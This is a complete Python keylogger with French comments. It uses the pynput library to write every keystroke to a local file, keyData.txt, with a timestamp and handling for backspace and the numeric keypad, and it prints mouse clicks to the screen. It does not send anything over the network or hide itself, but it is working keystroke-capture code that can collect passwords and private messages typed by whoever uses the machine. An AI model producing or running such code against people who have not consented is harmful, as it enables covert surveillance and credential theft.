from pynput import keyboard, mouse
from datetime import datetime

# Fonction pour ajouter la date au début du fichier
def log_date():
    with open("keyData.txt", 'a') as logKey:
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logKey.write(f"Date: {current_date}\n")

# Fonction pour gérer l'effacement avec la touche Backspace
def handle_backspace():
    with open("keyData.txt", 'rb+') as logKey:
        logKey.seek(0, 2)  # Aller à la fin du fichier
        if logKey.tell() > 0:  # Vérifier si le fichier n'est pas vide
            logKey.seek(-1, 2)  # Reculer d'un caractère
            logKey.truncate()  # Supprimer le dernier caractère

# Fonction appelée lorsqu'une touche est pressée
def keyPressed(key):
    with open("keyData.txt", 'a') as logKey:
        try:
            # Si c'est un caractère standard, on l'enregistre
            logKey.write(key.char)
        except AttributeError:
            # Ignorer les touches spéciales (comme Shift, Ctrl, etc.)
            if key == keyboard.Key.space:
                logKey.write(' ')  # Ajouter un espace pour la touche espace
            elif key == keyboard.Key.enter:
                logKey.write('\n')  # Ajouter un saut de ligne pour la touche entrée
            elif key == keyboard.Key.backspace:
                handle_backspace()  # Supprimer le dernier caractère
            elif key in [keyboard.KeyCode.from_vk(k) for k in range(96, 106)]:  # Pavé numérique (0-9)
                logKey.write(str(key.vk - 96))  # Ecrire les chiffres du pavé numérique

# Fonction appelée lorsqu'un clic de souris est détecté (mais non logué)
def onClick(x, y, button, pressed):
    if pressed:
        print(f"Mouse clicked at ({x}, {y}) with {button}")  # Seulement affiché à l'écran

if __name__ == "__main__":
    # Ajouter la date au début du fichier
    log_date()

    # Création et démarrage du listener pour le clavier et la souris
    with keyboard.Listener(on_press=keyPressed) as keyboard_listener, \
         mouse.Listener(on_click=onClick) as mouse_listener:
        keyboard_listener.join()  # Garde le programme en marche
        mouse_listener.join()  # Garde aussi la souris en écoute
